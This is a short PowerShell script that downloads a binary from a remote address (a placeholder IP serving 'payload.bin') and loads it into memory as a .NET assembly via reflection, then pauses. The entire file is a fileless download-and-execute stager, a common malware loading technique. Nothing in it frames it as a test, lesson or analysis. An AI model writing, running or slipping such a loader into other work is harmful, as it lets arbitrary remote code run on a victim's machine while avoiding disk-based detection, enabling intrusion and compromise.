
[CmdletBinding()]
param(
    [string]$FetchUrl = "http://198.51.100.96:80/payload.bin"
)
$AssemblyBytes = (New-Object System.Net.WebClient).DownloadData($FetchUrl)
[Reflection.Assembly]::Load($AssemblyBytes)
Start-Sleep -Seconds 8
